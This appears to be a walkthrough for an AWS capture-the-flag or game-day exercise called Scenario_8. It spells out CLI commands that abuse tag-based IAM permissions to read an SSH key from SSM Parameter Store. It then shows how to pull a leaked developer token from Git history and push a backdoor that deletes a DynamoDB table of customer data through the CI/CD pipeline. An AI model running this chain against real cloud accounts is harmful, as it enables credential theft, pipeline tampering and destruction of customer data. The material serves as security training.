# **Scenario_8**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

## **Configure your profile**

`aws configure --profile scenario8_<user_id>`

### **Get user policy**

`aws iam list-user-policies --user-name scenario8_<user_id> --profile scenario8_<user_id>`

`aws iam get-user-policy --user-name scenario8_<user_id> --policy-name scenario8-user-policy-<user_id> --profile scenario8_<user_id>`

**Note**: Note that the IAM policy attached to your user allows it to get a SSM parameters tagged with `Environment=sandbox`, and to manage tags tagged with `Environment=dev`.

`aws ssm describe-parameters --profile scenario8_<user_id>`

`aws ssm list-tags-for-resource --resource-type "Parameter" --resource-id "git_access_key_for_sc8_ro_user_<user_id>" --profile scenario8_<user_id>`

### **Change tags, get ssm parameter git_access_key**  

`aws ssm add-tags-to-resource --resource-type "Parameter" --resource-id "git_access_key_for_sc8_ro_user_<user_id>" --tags "Key=Environment,Value=sandbox" --profile scenario8_<user_id>`

`aws ssm get-parameter --name git_access_key_for_sc8_ro_user_<user_id> --query Parameter.Value --output text --profile scenario8_<user_id>`

## Step 3

Set up your local environment to clone the repository. In short:

- Copy the SSH key to your local machine (e.g. `.ssh/stolen_key`) and `chmod 700` it

- Use the following SSH configuration (in your `.ssh/config`):

```bash
Host <EC2_IP_ADDRESS>
 IdentityFile ~/.ssh/stolen_key
```

- Then, clone the repository using `git clone git@GIT_IP_ADDRESS:root/scenario8_<user_id>.git`  

Quick variant:  

- `aws ssm get-parameter --name git_access_key_for_sc8_ro_user_<user_id> --query Parameter.Value --output text --profile scenario8_<user_id> > stolen.key`

- `GIT_SSH_COMMAND='ssh -i stolen.key -o IdentitiesOnly=yes' git clone git@GIT_IP_ADDRESS:root/scenario8_<user_id>.git`

## Step 4

The repository contains the backend code of the Lambda function exposed through the API gateway. Check the commit history to note a leaked access token:  

`cd scenario8_<user_id>`  
`git log`  
`git show .....`

```diff
commit 0ca720ac2d27ae5a3a1b05ebe2c7f18aeba82b75 (HEAD -> main, origin/main, origin/HEAD)
Author: .....
Date:   .....

    buildspec.yml file - hardcoded keys removed

diff --git a/buildspec.yml b/buildspec.yml
index cce1afe..58059b8 100644
--- a/buildspec.yml
+++ b/buildspec.yml
@@ -8,9 +8,9 @@ phases:
     commands:
     - echo $LAMBDA_TASK_ROOT
     - echo "Get source from GitLab repository"
-    - git clone http://developer_<user_id>:<token>@<EC2_IP_ADDRESS>/root/scenario8_<user_id>.git
+    - git clone http://$USER:$TOKEN@$ADDRESS/root/scenario8_$USERID.git
     - echo "Building Docker image"
-    - docker build ./scenario8_<user_id> -t $ECR_REPOSITORY:latest
+    - docker build ./scenario8_$USERID -t $ECR_REPOSITORY:latest
   post_build:
     commands:
     - echo "Pushing Docker image to ECR"
```

## Step 5

These credentials you found belong to the user `developer_<user_id>`, who has pull and push access to this repository. Use this access to backdoor the application and delete table with the sensitive data that customers are sending to the API!

- Clone repository again with developer token:  

`git clone http://developer_<user_id>:<token>@<EC2_IP_ADDRESS>/root/scenario8_<user_id>.git`  

`cd scenario8_<user_id>`

- For instance, add a piece of code into app.py that delete targetdb-<user_id> table with data:

`table.delete()`

```diff --git a/app.py b/app.py
new file mode 100644
index 0000000..ed7fbfc
--- /dev/null
+++ b/app.py
@@ -0,0 +1,70 @@
import json
import boto3
from boto3.dynamodb.conditions import Attr
from decimal import Decimal

dynamodb = boto3.resource('dynamodb')

table = dynamodb.Table('targetdb-<user_id>')
+table.delete()
def handle(event):
```

- Commit the file and push it:

`git commit -am "some changes"`  

`git push`

Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. After a few minutes, your backdoored application will be deployed, table deleted and your will receive the flag!
